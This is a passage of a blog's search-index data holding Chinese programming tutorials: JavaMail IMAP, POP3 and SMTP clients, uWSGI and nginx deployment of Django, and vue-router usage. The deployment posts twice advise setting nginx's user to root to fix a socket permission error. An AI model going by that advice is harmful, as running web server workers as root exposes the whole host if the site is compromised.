System.out.println(&quot;[&quot; + subject + &quot;]未读，是否需要阅读此邮件（yes/no）？&quot;); POP3.parseMessage(msg); // 解析邮件 &#125; // 关闭资源 folder.close(false); store.close(); &#125;&#125; 参数分析 版本4rev1（IMAP4rev1）允许一个客户端访问和操作在一个服务器上的电子邮件。SELECT INBOX： 选择收件箱 EXISTS： 3封存在 FETCH &lt;mail id&gt;&lt;datanames&gt; ENVELOPE：信息的信封结构。 INTERNALDATE：自身的时间。 RFC822.SIZE：邮件的[RFC-2822]大小。 BODYSTRUCTUR： 是邮件的[MIME-IMB]的体结构。这是服务器通过解析[RFC-2822]头中的[MIME-IMB]各字段和[MIME-IMB]头信息得出来 的。包括的内容有：邮件正文的类型、字符集、编码方式等。 BODY[TEXT]：返回整个邮件体，这里的邮件体并不包括邮件头。 FLAGS：此邮件的标志。 EXAMINE：以只读方式打开邮箱，参数是需要打开的邮箱的名字，使用EXAMINE命令打开的邮箱不允许对邮件进行改动，因此不能增加或删除邮件的标志。 CLOSE：表示Client结束对当前Folder（文件夹&#x2F;邮箱）的访问，关闭邮箱该邮箱中所有标志为、DELETED的邮件就被从物理上删除。CLOSE没有命令参数。随后可以SELECT另一Folder。 LOGOUT：结束本次IMAP会话。","categories":[],"tags":[{"name":"电子邮件","slug":"电子邮件","permalink":"https://blog.zhengxiangling.com/tags/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/"},{"name":"Java","slug":"Java","permalink":"https://blog.zhengxiangling.com/tags/Java/"},{"name":"IMAP","slug":"IMAP","permalink":"https://blog.zhengxiangling.com/tags/IMAP/"}],"author":"Elijah Zheng"},{"title":"电子邮件的实现之 POP3（Java版）","slug":"电子邮件的实现之-POP3（Java版）","date":"2017-11-25T02:47:00.000Z","updated":"2023-11-17T14:27:30.010Z","comments":true,"path":"2017/11/25/电子邮件的实现之-POP3（Java版）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/11/25/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-POP3%EF%BC%88Java%E7%89%88%EF%BC%89/","excerpt":"POP3，全名为“Post Office Protocol - Version 3”，即“邮局协议版本3”。是TCP&#x2F;IP协议族中的一员，由RFC1939 定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供了SSL加密的POP3协议被称为POP3S。POP 协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端送到个人终端机器上，一般是PC机或 MAC。一旦邮件发送到 PC 机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”，也就是改进的POP3协议。","text":"POP3，全名为“Post Office Protocol - Version 3”，即“邮局协议版本3”。是TCP&#x2F;IP协议族中的一员，由RFC1939 定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供了SSL加密的POP3协议被称为POP3S。POP 协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件。这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端送到个人终端机器上，一般是PC机或 MAC。一旦邮件发送到 PC 机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”，也就是改进的POP3协议。 POP3协议默认端口：110 POP3协议默认传输协议：TCP POP3协议适用的构架结构：C&#x2F;S POP3协议的访问模式：离线访问 POP3命令码 命令 描述 USER [username] 处理用户名 PASS [password] 处理用户密码 APOP [Name,Digest] 认可Digest是MD5消息摘要 STAT 处理请求服务器发回关于邮箱的统计资料，如邮件总数和总字节数 UIDL [Msg#] 处理返回邮件的唯一标识符，POP3会话的每个标识符都将是唯一的 LIST [Msg#] 处理返回邮件数量和每个邮件的大小 RETR [Msg#] 处理返回由参数标识的邮件的全部文本 DELE [Msg#] 处理服务器将由参数标识的邮件标记为删除，由quit命令执行 RSET 处理服务器将重置所有标记为删除的邮件，用于撤消DELE命令 TOP [Msg# n] 处理服务器将返回由参数标识的邮件前n行内容，n必须是正整数 NOOP 处理服务器返回一个肯定的响应 QUIT 终止会话 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108package POP3;import java.io.IOException;import java.util.Properties;import javax.mail.BodyPart;import javax.mail.Folder;import javax.mail.Message;import javax.mail.MessagingException;import javax.mail.Multipart;import javax.mail.Part;import javax.mail.Session;import javax.mail.Store;import javax.mail.internet.MimeMessage;public class POP3 &#123; public static void main(String[] args) &#123; String protocol = &quot;pop3&quot;;// 使用pop3协议 String host = &quot;pop.sina.cn&quot;;// 163邮箱的pop3服务器 int port = 110;// 端口 String username = &quot;your_name@sina.cn&quot;;// 用户名 String password = &quot;your_password&quot;;// 密码 /* * Properties是一个属性对象，用来创建Session对象 */ Properties props = new Properties(); props.put(&quot;mail.pop3.host&quot;, host); props.put(&quot;mail.pop3.port&quot;, port); /* * Session类定义了一个基本的邮件对话。 */ Session session = Session.getDefaultInstance(props); /* * Store类实现特定邮件协议上的读、写、监视、查找等操作。 通过Store类可以访问Folder类。 * Folder类用于分级组织邮件，并提供照Message格式访问email的能力。 */ Store store = null; Folder folder = null; try &#123; store = session.getStore(protocol); store.connect(username, password); folder = store.getFolder(&quot;INBOX&quot;); folder.open(Folder.READ_ONLY);// 在这一步，收件箱所有邮件将被下载到本地 // int size = folder.getMessageCount();// 获取邮件数目 Message[] messages = folder.getMessages(); // Message message = folder.getMessage(size);// 取得最新的那个邮件 // 解析邮件内容 for (int i = 0, count = 2; i &lt; count; i++) &#123; MimeMessage msg = (MimeMessage) messages[i]; parseMessage(msg); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (folder != null) &#123; folder.close(false); &#125; if (store != null) &#123; store.close(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; System.out.println(&quot;接收完毕！&quot;); &#125; public static void getMailTextContent(Part part, StringBuffer content) throws MessagingException, IOException &#123; // 如果是文本类型的附件，通过getContent方法可以取到文本内容，但这不是我们需要的结果，所以在这里要做判断 boolean isContainTextAttach = part.getContentType().indexOf(&quot;name&quot;) &gt; 0; if (part.isMimeType(&quot;text/*&quot;) &amp;&amp; !isContainTextAttach) &#123; content.append(part.getContent().toString()); &#125; else if (part.isMimeType(&quot;message/rfc822&quot;)) &#123; getMailTextContent((Part) part.getContent(), content); &#125; else if (part.isMimeType(&quot;multipart/*&quot;)) &#123; Multipart multipart = (Multipart) part.getContent(); int partCount = multipart.getCount(); for (int i = 0; i &lt; partCount; i++) &#123; BodyPart bodyPart = multipart.getBodyPart(i); getMailTextContent(bodyPart, content); &#125; &#125; &#125; public static void parseMessage(MimeMessage msg) throws MessagingException, IOException &#123; // TODO Auto-generated method stub System.out.println(&quot;------------------解析第&quot; + msg.getMessageNumber() + &quot;封邮件-------------------- &quot;); String from = msg.getFrom()[0].toString(); String subject = msg.getSubject(); java.util.Date date = msg.getSentDate(); System.out.println(&quot;From: &quot; + from); System.out.println(&quot;Subject: &quot; + subject); System.out.println(&quot;Date: &quot; + date); StringBuffer content = new StringBuffer(30); getMailTextContent(msg, content); System.out.println(&quot;邮件正文：&quot; + (content.length() &gt; 100 ? content.substring(0, 100) + &quot;...&quot; : content)); System.out.println(&quot;------------------第&quot; + msg.getMessageNumber() + &quot;封邮件解析结束-------------------- &quot;); System.out.println(); &#125;&#125; 参数分析 CAPA：开始与 POP3 Server 送出的第一个指令，用于取得此服务器的功能选项清单 Capability list follows 返回指令 USER：与 POP3 Server 送出帐户名 PASS：与 POP3 Server 送出密码 STAT：取得服务器上本帐户存在的信件数量 NOOP：服务器返回一个肯定的响应，用于测试连接是否成功 TOP n m：取得第n封信件前m行的内容 TCP Spurious Retransmission：TCP虚假重传。 当抓到2次同一包数据时，wireshark判断网络发生了重传，同时，wireshark抓到初传包的反馈ack，因此wireshark判断初传包实际并没有丢失，因此称为虚假重传。 IMF： Internet Message Format RETR n：取得第n封信件完整内容 octet &#x3D; 1 Byte &#x3D; 8 bits QUIT 告知 POP3 服务器即将说再见．","categories":[],"tags":[{"name":"电子邮件","slug":"电子邮件","permalink":"https://blog.zhengxiangling.com/tags/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/"},{"name":"Java","slug":"Java","permalink":"https://blog.zhengxiangling.com/tags/Java/"},{"name":"POP3","slug":"POP3","permalink":"https://blog.zhengxiangling.com/tags/POP3/"}],"author":"Elijah Zheng"},{"title":"电子邮件的实现之 SMTP（Java版）","slug":"电子邮件的实现之-SMTP","date":"2017-11-22T15:24:00.000Z","updated":"2023-11-17T14:27:30.011Z","comments":true,"path":"2017/11/22/电子邮件的实现之-SMTP/","link":"","permalink":"https://blog.zhengxiangling.com/2017/11/22/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B9%8B-SMTP/","excerpt":"1.SMTP协议简介 SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议，目标是向用户提供高效、可靠的邮件传输。它的一个重要特点是它能够在传送中接力传送邮件，即邮件可以通过不同网络上的主机接力式传送。通常它工作在两种情况下：一是邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP 是一个请求&#x2F;响应协议，它监听 25 号端口，用于接收用户的 Mail 请求，并与远端 Mail 服务器建立 SMTP 连接。","text":"1.SMTP协议简介 SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议，目标是向用户提供高效、可靠的邮件传输。它的一个重要特点是它能够在传送中接力传送邮件，即邮件可以通过不同网络上的主机接力式传送。通常它工作在两种情况下：一是邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP 是一个请求&#x2F;响应协议，它监听 25 号端口，用于接收用户的 Mail 请求，并与远端 Mail 服务器建立 SMTP 连接。 2.SMTP协议工作机制 SMTP通常有两种工作模式。发送SMTP和接收SMTP。具体工作方式为：发送SMTP在接收到用户的邮件请求后，判断此邮件是否为本地邮件，若是直接投送到用户的邮箱，否则向DNS查询远端邮件服务器的MX记录，并建立与远端接收SMTP之间的一个双向传送通道，此后SMTP命令由发送SMTP发出，由接收SMTP接收，而应答则反方向传送。一旦传送通道建立，SMTP发送者发送MAIL命令指明邮件发送者。如果SMTP接收者可以接收邮件则返回OK应答。SMTP发送者再发出RCPT命令确认邮件是否接收到。如果SMTP接收者接收，则返回OK应答；如果不能接收到，则发出拒绝接收应答（但不中止整个邮件操作），双方将如此反复多次。当接收者收到全部邮件后会接收到特别的序列，入伏哦接收者成功处理了邮件，则返回OK应答。 3.SMTP的连接和发送过程（a）建立TCP连接（b）客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器端正希望以OK作为响应，表明准备接收。（c）客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；服务器端则表示是否愿意为收件人接收邮件（d）协商结束，发送邮件，用命令DATA发送（e）以.表示结束输入内容一起发送出去（f）结束此次发送，用QUIT命令退出。 4.准备工作 1）注册新浪邮箱 2）准备包文件 activation-1.1.jar 以及 javax.mail-1.4.4.jar 下载链接 activation-1.1.jarjavax.mail-1.4.4.jar 3)导入包文件 在项目中新建lib文件夹，将两个包文件放入文件夹中 右击包文件，选择 Build Path -&gt; Configure Build Path，然后出现下图点击 Libralies -&gt; Add JARS -&gt; 选中lib文件夹中的 .jar文件，重复步骤导入两个包文件 5.代码 1234567891011121314151617181920212223242526272829303132333435363738package SMTP;import javax.mail.Address;import javax.mail.Message;import javax.mail.MessagingException;import javax.mail.Session;import javax.mail.Transport;import javax.mail.internet.InternetAddress;import javax.mail.internet.MimeMessage;import com.sun.mail.util.MailSSLSocketFactory;import java.security.GeneralSecurityException;import java.util.Date;import java.util.Properties;public class SMTP &#123; public static void main(String[] args) throws MessagingException, GeneralSecurityException &#123; Properties props = new Properties(); // 开启debug调试 props.setProperty(&quot;mail.debug&quot;, &quot;true&quot;); // 发送服务器需要身份验证 props.setProperty(&quot;mail.smtp.auth&quot;, &quot;true&quot;); // 设置邮件服务器主机名 props.setProperty(&quot;mail.host&quot;, &quot;smtp.sina.cn&quot;); // 发送邮件协议名称 props.setProperty(&quot;mail.transport.protocol&quot;, &quot;smtp&quot;); Session session = Session.getInstance(props); Message msg = new MimeMessage(session); msg.setSubject(&quot;STMP 测试&quot;); StringBuilder builder = new StringBuilder(); builder.append(&quot;My name is Elijah&quot;); msg.setText(builder.toString()); msg.setFrom(new InternetAddress(&quot;your_number@sina.cn&quot;)); Transport transport = session.getTransport(); transport.connect(&quot;smtp.sina.cn&quot;, &quot;xxx@sina.cn&quot;, &quot;your_password&quot;); transport.sendMessage(msg, new Address[] &#123; new InternetAddress(&quot;xxx@sina.cn&quot;) &#125;); transport.close(); &#125; &#125; 参数分析 SMTP的响应，它的一般形式是：XXX Readable Illustration。XXX是三位十进制数；Readable Illustration是可读的解释说明，用来表明命令是否成功等。XXX具有如下的规律：以2开头的表示成功，以4和5开头的表示失败，以3开头的表示未完成（进行中） C: client S: server 域服务器准备好了，之后的为域服务器自动返回的信息 HELO 客户端为标识自己的身份而发送的命令（通常带域名） 250 请求动作完成 AUTH LOGIN 请求认证 等待用户输入验证信息 dxNlcm5hbWU6 服务器的响应——经过base64编码了的“Username”&#x3D; 334 UGFzc3dvcmQ6 经过BASE64编码了的”Password:”&#x3D; 235 auth successfully 认证成功 MAIL FROM: 发送者邮箱 RCPT TO: 接收者邮箱 DATA 请求发送数据 开始邮件输入，以.结束 回车 + 换行 QUIT 终止会话 服务器关闭","categories":[],"tags":[{"name":"电子邮件","slug":"电子邮件","permalink":"https://blog.zhengxiangling.com/tags/%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/"},{"name":"SMTP","slug":"SMTP","permalink":"https://blog.zhengxiangling.com/tags/SMTP/"},{"name":"JAVA","slug":"JAVA","permalink":"https://blog.zhengxiangling.com/tags/JAVA/"}],"author":"Elijah Zheng"},{"title":"使用uWSGI + nginx 提高性能，配置 uWSGI 使用 .ini 文件去运行项目（基本配置）","slug":"使用uWSGI-nginx-提高性能，配置-uWSGI-使用-ini-文件去运行项目（基本配置）","date":"2017-10-27T06:16:00.000Z","updated":"2023-11-17T14:27:30.008Z","comments":true,"path":"2017/10/27/使用uWSGI-nginx-提高性能，配置-uWSGI-使用-ini-文件去运行项目（基本配置）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/10/27/%E4%BD%BF%E7%94%A8uWSGI-nginx-%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%85%8D%E7%BD%AE-uWSGI-%E4%BD%BF%E7%94%A8-ini-%E6%96%87%E4%BB%B6%E5%8E%BB%E8%BF%90%E8%A1%8C%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%EF%BC%89/","excerpt":"快速配置 uWSGI + nginx 运行Django 项目","text":"快速配置 uWSGI + nginx 运行Django 项目 1.新建 Django 项目 12django-admin startproject site_uwsgicd site_uwsgi 2.对网站进行 nginx 配置 目录中新建 site_uwsgi.conf 文件 12345678910111213141516171819202122server &#123; listen 8001; server_name your_server_name.com; client_max_body_size 50m; location /static/ &#123; alias /data/www/vhosts/site_uwsgi/static/; &#125; location / &#123; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; uwsgi_pass web; include /data/www/vhosts/site_uwsgi/uwsgi_params; &#125; access_log /var/log/nginx/site_uwsgi.access_log; error_log /var/log/nginx/site_uwsgi.error_log;&#125;upstream web &#123; server unix:///data/www/vhosts/site_uwsgi/socket.sock;&#125; 连接进 /etc/nginx/sites-enabled/中 1sudo ln -s /data/www/vhosts/site_uwsgi/site_uwsgi.conf /etc/nginx/sites-enabled/ 3.编辑 site_uwsgi/settings.py 文件及收集静态资源 12ALLOWED_HOSTS = [&#x27;...&#x27;] # 有服务器的话需增加服务器ipSTATIC_ROOT = os.path.join(BASE_DIR, &#x27;static/&#x27;) 收集静态资源 1python manage.py collectstatic 4.目录中新建 uwsgi_params 文件 12345678910111213141516uwsgi_param QUERY_STRING $query_string;uwsgi_param REQUEST_METHOD $request_method;uwsgi_param CONTENT_TYPE $content_type;uwsgi_param CONTENT_LENGTH $content_length;uwsgi_param REQUEST_URI $request_uri;uwsgi_param PATH_INFO $document_uri;uwsgi_param DOCUMENT_ROOT $document_root;uwsgi_param SERVER_PROTOCOL $server_protocol;uwsgi_param REQUEST_SCHEME $scheme;uwsgi_param HTTPS $https if_not_empty;uwsgi_param REMOTE_ADDR $remote_addr;uwsgi_param REMOTE_PORT $remote_port;uwsgi_param SERVER_PORT $server_port;uwsgi_param SERVER_NAME $server_name; 5.修改 /etc/nginx/nginx.conf 的 user 为 root 用户 重启 nginx 1sudo /etc/init.d/nginx restart 6.配置 uWSGI 使用 .ini 文件去运行项目site_uwsgi.ini 1234567891011121314151617181920212223# site_uwsgi.ini file[uwsgi]# Django-related settings# the base directory (full path)chdir = /data/www/vhosts/site_uwsgi/# Django&#x27;s wsgi filemodule = site_uwsgi.wsgi# the virtualenv (full path)# process-related settings# mastermaster = true# maximum number of worker processesprocesses = 30# the socket (use the full path to be safesocket = /data/www/vhosts/site_uwsgi/socket.sock# ... with appropriate permissions - may be neededchmod-socket = 664# clear environment on exitvacuum = true# pidfilepidfile = /data/www/vhosts/site_uwsgi/site_uwsgi.pid# logger# daemonize = /data/www/vhosts/site_uwsgi/access.log 7.后台挂载 uwsgi: 1nohup uwsgi --ini mysite_uwsgi.ini &amp; 输入 ip:8001, done 8.挂载之后，每次修改models.py，需要 reload uwsgi，和重启数据库 12uwsgi --reload yxpp.pidservice mysql restart","categories":[],"tags":[{"name":"服务器","slug":"服务器","permalink":"https://blog.zhengxiangling.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"uWSGI","slug":"uWSGI","permalink":"https://blog.zhengxiangling.com/tags/uWSGI/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.zhengxiangling.com/tags/nginx/"}],"author":"Elijah Zheng"},{"title":"使用uWSGI + nginx 提高性能，部署Django项目（入门）","slug":"使用uWSGI-nginx提高性能，部署Django项目（入门）","date":"2017-10-26T13:03:00.000Z","updated":"2023-11-17T14:27:30.008Z","comments":true,"path":"2017/10/26/使用uWSGI-nginx提高性能，部署Django项目（入门）/","link":"","permalink":"https://blog.zhengxiangling.com/2017/10/26/%E4%BD%BF%E7%94%A8uWSGI-nginx%E6%8F%90%E9%AB%98%E6%80%A7%E8%83%BD%EF%BC%8C%E9%83%A8%E7%BD%B2Django%E9%A1%B9%E7%9B%AE%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/","excerpt":"概念Web服务器是面向外部世界的。它可以直接从文件系统中提供（HTML, images, CSS 等）服务文件。然而，它不能直接和Django应用进行通信；它需要可以运行应用程序的东西，从web客户端（如浏览器）中请求它和返回响应。 Web服务网关接口（Web Server Gateway Interface） - WSGI - 扮演着这个角色。WSGI 是基于Python的一个标准。 uWSGI 是一个Web服务器，实现了 WSGI、uwsgi、http等协议。","text":"概念Web服务器是面向外部世界的。它可以直接从文件系统中提供（HTML, images, CSS 等）服务文件。然而，它不能直接和Django应用进行通信；它需要可以运行应用程序的东西，从web客户端（如浏览器）中请求它和返回响应。 Web服务网关接口（Web Server Gateway Interface） - WSGI - 扮演着这个角色。WSGI 是基于Python的一个标准。 uWSGI 是一个Web服务器，实现了 WSGI、uwsgi、http等协议。 使用 uWSGI 前的准备工作具体代码基于 Linux(Ubuntu)，window 和 mac 的环境安装方法和引用的文件路径可能会存在偏差。 virtualenv（自选）Python的虚拟环境，可以切换不同python的版本。这里不介绍virtualenv的安装。 123virtualenv uwsgi-tutorialcd uwsgi-tutorialsource bin/activate Django安装 Django 123pip install Djangodjango-admin.py startproject mysitecd mysite uWSGI 基本安装和配置安装 uWSGI1pip install uwsgi 当然还有其他的方法来安装uWSGI，不过pip来安装是最好的安装方法之一。 基本测试创建 test.py 文件 12345# test.pydef application(env, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;,&#x27;text/html&#x27;)]) return [b&quot;Hello World&quot;] # python3 #return [&quot;Hello World&quot;] # python2 Python3 返回字符串时要求用bytes() 运行 uWSGI: 1uwsgi --http :8000 --wsgi-file test.py 选项参数说明： 参数 解释 http:8000 使用http协议，端口8000 wsgi-file test.py 加载指定的文件，test.py 测试你的Django项目现在我们用 uWSGI 去运行Django网站。 先测试你的mysite项目已经可以运行: 1python manage.py runserver 0.0.0.0:8000 如果已经可以运行，换用uWSGI来运行: 1uwsgi --http :8000 --module mysite.wsgi module mysite.wsgi： 加载指定的wsgi模块 如果能够成功进行访问，说明uWSGI已经能够对Django应用服务。 nginx 基本配置安装 nginx12sudo apt-get install nginxsudo /etc/init.d/nginx start # start nginx 对网站进行 nginx 配置现在需要 uwsgi_params文件，在 nginx 目录中 uWSGI分配时会用来。可以从 https://github.com/nginx/nginx/blob/master/conf/uwsgi_params 中复制此文件放在项目的目录中。然后在 nginx 中将会使用到它。 现在创建一个 mysite_nginx.conf 文件，将下列信息填入： 123456789101112131415161718192021222324252627282930313233# mysite_nginx.conf# the upstream component nginx needs to connect toupstream django &#123; #server unix:///data/www/vhosts/mysite/socket.sock; #for a file socket&#125;# configuration of the serverserver &#123; # the port your site will be served on listen 8000; # the domain name it will serve for server_name your_server_name.com; # substitute your machine&#x27;s IP address or FQDN charset utf-8; # max upload size client_max_body_size 75M; # adjust to taste # Django media location /media &#123; alias /data/www/vhosts/mysite/media; # your Django project&#x27;s media files - amend as required &#125; location /static &#123; alias /data/www/vhosts/mysite/static; # your Django project&#x27;s static files - amend as required &#125; # Finally, send all non-media requests to the Django server. location / &#123; uwsgi_pass django; include /data/www/vhosts/mysite/uwsgi_params; # the uwsgi_params file you installed &#125;&#125; 这个配置文件告诉nginx去服务从系统文件来的媒体和静态文件，和处理来自Django干预的请求。对于大规模部署的项目，需要很好的考虑让一个服务去处理静态&#x2F;媒体资源，另一个去处理Django的应用，但是现在这个配置已经够用了。 然后用链接符号ln将该文件放到/etc/nginx/sites-enabled中 1sudo ln -s /data/www/vhosts/mysite/mysite_nginx.conf /etc/nginx/sites-enabled/ 部署静态文件在运行 nginx 之前，你需要手机 Django 的静态文件放到静态文件夹中。编辑 mysite/settings.py 增加： 1STATIC_ROOT = os.path.join(BASE_DIR, &quot;static/&quot;) 然后执行 1python manage.py collectstatic nginx 基本测试重启 nginx： 1sudo /etc/init.d/nginx restart 在mysite项目新建media文件夹，在其中放入一张media.png图片，访问 http://0.0.0.0:8000/media/media.png ，如果成功访问，说明 nginx 已成功对文件进行服务。 如果访问失败，看错误日志然后做相应的修改，然后重启 nginx。 使用 Unix sockets 来代替端口到目前为止，我们已经使用了TCP端口的套接字（socket），因为它比较的简单，但实际上使用 Unix socket 会更好 - 开销较少。 编辑 mysite_nginx.conf取消下列注释 1server unix:///data/www/vhosts/mysite/mysite.sock; # for a file socket 然后重启 nginx然后重新运行 uWSGI： 1uwsgi --socket mysite.sock --wsgi-file test.py 这次是使用 socket选项去告诉配置 uWSGI 。 如果启动失败，检查 nginx 错误日志 （&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log） 如果出现connect() to unix:///data/www/vhosts/mysite/mysite.sock failed (13: Permission denied)修改 /etc/nginx/nginx.conf的user为root用户 配置 uWSGI 使用 .ini 文件去运行项目创建 mysite_uwsgi.ini 文件： 1234567891011121314151617181920212223242526# mysite_uwsgi.ini file[uwsgi]# Django-related settings# the base directory (full path)chdir = /data/www/vhosts/mysite/# Django&#x27;s wsgi filemodule = mysite.wsgi# the virtualenv (full path)# process-related settings# mastermaster = true# maximum number of worker processesprocesses = 30# the socket (use the full path to be safesocket = /data/www/vhosts/mysite/socket.sock# ... with appropriate permissions - may be neededchmod-socket = 664# clear environment on exitvacuum = true# pidfilepidfile = /data/www/vhosts/mysite/mysite.pid# logger# daemonize = /data/www/vhosts/mysite/access.log 然后使用该文件运行 uswgi： 1uwsgi --ini mysite_uwsgi.ini # the --ini option is used to specify a file 参考文献：Setting up Django and your web server with uWSGI and nginxhttp://uwsgi-docs.readthedocs.io/en/latest/tutorials/Django_and_nginx.html#basic-uwsgi-installation-and-configuration","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"https://blog.zhengxiangling.com/tags/Django/"},{"name":"nginx","slug":"nginx","permalink":"https://blog.zhengxiangling.com/tags/nginx/"},{"name":"性能","slug":"性能","permalink":"https://blog.zhengxiangling.com/tags/%E6%80%A7%E8%83%BD/"}],"author":"Elijah Zheng"},{"title":"Vue2.X Router 的使用","slug":"Vue2-X-Router-的使用","date":"2017-10-14T02:23:00.000Z","updated":"2023-11-17T14:27:30.003Z","comments":true,"path":"2017/10/14/Vue2-X-Router-的使用/","link":"","permalink":"https://blog.zhengxiangling.com/2017/10/14/Vue2-X-Router-%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"用 Vue.js + vue-router 创建单页应用，是非常简单的。使用 Vue.js ，我们已经可以通过组合组件来组成应用程序，当你要把 vue-router 添加进来，我们需要做的是，将组件(components)映射到路由(routes)，然后告诉 vue-router 在哪里渲染它们。","text":"用 Vue.js + vue-router 创建单页应用，是非常简单的。使用 Vue.js ，我们已经可以通过组合组件来组成应用程序，当你要把 vue-router 添加进来，我们需要做的是，将组件(components)映射到路由(routes)，然后告诉 vue-router 在哪里渲染它们。 安装默认vue-cli初始化（init）的时候会提示是否选择安装（选择yes），安装就完成了。 使用基本使用vue 1234567891011&lt;template&gt; &lt;div id=&quot;app&quot;&gt; &lt;!-- 使用 router-link 组件来导航. --&gt; &lt;!-- 通过传入 `to` 属性指定链接. --&gt; &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt; &lt;router-link to=&quot;/index&quot;&gt;Go to Index&lt;/router-link&gt; &lt;!-- 路由出口 --&gt; &lt;!-- 路由匹配到的组件将渲染在这里 --&gt; &lt;router-view&gt;&lt;/router-view&gt; &lt;/div&gt;&lt;/template&gt; router/index.js 123456789101112131415import Vue from &#x27;vue&#x27;import Router from &#x27;vue-router&#x27;// import index.vue 页面import Index from &#x27;@/components/index&#x27;Vue.use(Router)export default new Router(&#123; routes: [ &#123; path: &#x27;/index&#x27;, name: &#x27;index&#x27;, component: Index &#125;]&#125;) 这样就会在&lt;router-link to=&quot;/index&quot;&gt;Go to Index&lt;/router-link&gt;中渲染一个a标签，点击跳转到/index，然后在&lt;router-view&gt;&lt;/router-view&gt;中渲染组件index.vue 配置重定向123456789101112export default new Router(&#123; routes: [ &#123; path: &#x27;/&#x27;, redirect: &#x27;/index&#x27; &#125;, &#123; path: &#x27;/index&#x27;, name: &#x27;index&#x27;, component: Index &#125;]&#125;) 这样在访问根路径为/时，会跳转到/index路径，达到访问默认域名时，直接跳转到首页的效果。 配置点击路由时，路径的默认class类名（linkActiveClass）1234567891011121314export default new Router(&#123; routes: [ &#123; path: &#x27;/&#x27;, redirect: &#x27;/index&#x27; &#125;, &#123; path: &#x27;/index&#x27;, name: &#x27;index&#x27;, component: Index &#125;] , linkActiveClass: &#x27;nav-active&#x27;&#125;) 如果不配置，默认值为router-link-exact-active 配置路由的子路由及动态路由器配12345678910111213141516171819202122232425import ArticleDetail from &#x27;@/components/article_detail/article_detail&#x27;export default new Router(&#123; routes: [ &#123; path: &#x27;/&#x27;, redirect: &#x27;/index&#x27; &#125;, &#123; path: &#x27;/index&#x27;, name: &#x27;index&#x27;, component: Index, children: [ &#123; path: &#x27;/index/:id&#x27;, component: ArticleDetail &#125;, &#123; path: &#x27;/search&#x27;, component: Search &#125; ] &#125;] , linkActiveClass: &#x27;nav-active&#x27;&#125;) 配置子路由，只需在父路由里添加children属性，然后配置子路由即可，并在子路由的页面添加&lt;router-link&gt;&lt;/router-link&gt;。 动态路由/index/:id/的 id值可以用this.$route.params.id取到。","categories":[],"tags":[{"name":"Vue","slug":"Vue","permalink":"https://blog.zhengxiangling.com/tags/Vue/"},{"name":"vue-router","slug":"vue-router","permalink":"https://blog.zhengxiangling.com/tags/vue-router/"}],"author":"Elijah Zheng"},{"title":"vue 使用 fastclick 和 lazyload 图片懒加载","slug":"vue-使用-fastclick-和-lazyload-图片懒加载","date":"2017-10-13T05:41:00.000Z","updated":"2023-11-17T14:27:30.007Z","comments":true,"path":"2017/10/13/vue-使用-fastclick-和-lazyload-图片懒加载/","link":"","permalink":"https://blog.zhengxiangling.com/2017/10/13/vue-%E4%BD%BF%E7%94%A8-fastclick-%E5%92%8C-lazyload-%E5%9B%BE%E7%89%87%E6%87%92%E5%8A%A0%E8%BD%BD/","excerpt":"使用fastclickfastclick用来处理移动端 click 事件 300 毫秒延迟。 为什么会存在延迟？根据谷歌开发者文档 …mobile browsers will wait approximately 300ms from the time that you tap the button to fire the click event. The reason for this is that the browser is waiting to see if you are actually performing a double tap. 从点击屏幕上的元素到触发元素的 click 事件，移动浏览器会有大约 300 毫秒的等待时间。为什么这么设计呢？ 因为它想看看你是不是要进行双击（double tap）操作。","text":"使用fastclickfastclick用来处理移动端 click 事件 300 毫秒延迟。 为什么会存在延迟？根据谷歌开发者文档 …mobile browsers will wait approximately 300ms from the time that you tap the button to fire the click event. The reason for this is that the browser is waiting to see if you are actually performing a double tap. 从点击屏幕上的元素到触发元素的 click 事件，移动浏览器会有大约 300 毫秒的等待时间。为什么这么设计呢？ 因为它想看看你是不是要进行双击（double tap）操作。 npm安装 1234567npm install --save 